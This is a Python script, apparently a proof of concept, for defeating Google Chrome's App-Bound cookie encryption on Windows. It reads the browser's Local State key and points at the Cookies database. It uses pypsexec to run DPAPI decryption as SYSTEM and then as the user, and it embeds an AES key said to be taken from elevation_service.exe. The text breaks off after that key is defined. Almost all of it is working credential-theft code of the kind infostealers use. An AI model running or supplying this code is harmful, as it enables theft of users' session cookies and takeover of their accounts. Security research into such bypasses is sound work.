import os
import json
import sys
import binascii
from pypsexec.client import Client
from Crypto.Cipher import AES
import sqlite3
import pathlib

local_state_db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Local State')
cookie_db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')

with open(local_state_db, 'r') as f:
    local_state = json.load(f)

os_crypt = local_state["os_crypt"]

app_bound_encrypted_key = os_crypt["app_bound_encrypted_key"]

arguments = "-c \"" + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'),None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace("\n",";") + "\""

c = Client("localhost")
c.connect()

try:
    c.create_service()

    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    app_bound_encrypted_key_b64 = binascii.b2a_base64(
        binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

    # decrypt with SYSTEM DPAPI
    encrypted_key_b64, stderr, rc = c.run_executable(
        sys.executable,
        arguments=arguments.format(app_bound_encrypted_key_b64),
        use_system_account=True
    )

    # decrypt with user DPAPI
    decrypted_key_b64, stderr, rc = c.run_executable(
        sys.executable,
        arguments=arguments.format(encrypted_key_b64.decode().strip()),
        use_system_account=False
    )

    decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
    
finally:
    c.remove_service()
    c.disconnect()

# decrypt key with AES256GCM
# aes key from elevation_service.exe
aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
